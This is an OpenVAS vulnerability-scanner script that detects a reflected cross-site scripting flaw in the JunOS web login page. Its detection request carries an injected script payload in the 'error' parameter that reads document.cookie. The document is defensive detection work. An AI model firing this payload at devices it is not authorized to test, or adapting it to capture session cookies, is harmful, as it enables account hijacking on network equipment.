###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_junos_web_login_xss_vuln.nasl 11401 2018-09-15 08:45:50Z cfischer $
#
# JunOS Web Login Cross Site Scripting Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803775");
  script_version("$Revision: 11401 $");
  script_bugtraq_id(63656);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-11-18 13:23:22 +0530 (Mon, 18 Nov 2013)");
  script_name("JunOS Web Login Cross Site Scripting Vulnerability");


  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary
HTML and script code in a user's browser session in the context of an affected
site.");
  script_tag(name:"affected", value:"JunOS version to 11.4 and prior (probably 12.1 and 12.3 vulnerable)");
  script_tag(name:"insight", value:"The flaw is due to an improper validation of user-supplied input via the
'error' parameter to the 'index.php', which allows the attackers to execute
arbitrary HTML and script code in a user's browser session in the context
of an affected site.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP GET request and check whether it
is able to read the cookie or not.");
  script_tag(name:"summary", value:"This host is running JunOS and is prone to cross-site scripting
vulnerability.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/63656");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/junos-114-cross-site-scripting");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("Mbedthis-Appweb/banner");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

banner = get_http_banner(port:port);
if("Server: Mbedthis-Appweb/" >!< banner){
  exit(0);
}

res = http_get_cache(item:"/index.php", port:port);

if(res =~ "HTTP/1\.. 200" && "Juniper Networks, Inc" >< res && ">Log In" >< res)
{
  url = '/index.php?name=Your_Account&error=1"><script>' +
        'alert(document.cookie)<%2Fscript>&uname=bGF';

  if(http_vuln_check(port:port, url:url, check_header:TRUE,
     pattern:"><script>alert\(document\.cookie\)</script>",
     extra_check: make_list(">Log In", "Juniper Networks")))
  {
    report = report_vuln_url( port:port, url:url );
    security_message(port:port, data:report);
    exit(0);
  }
}
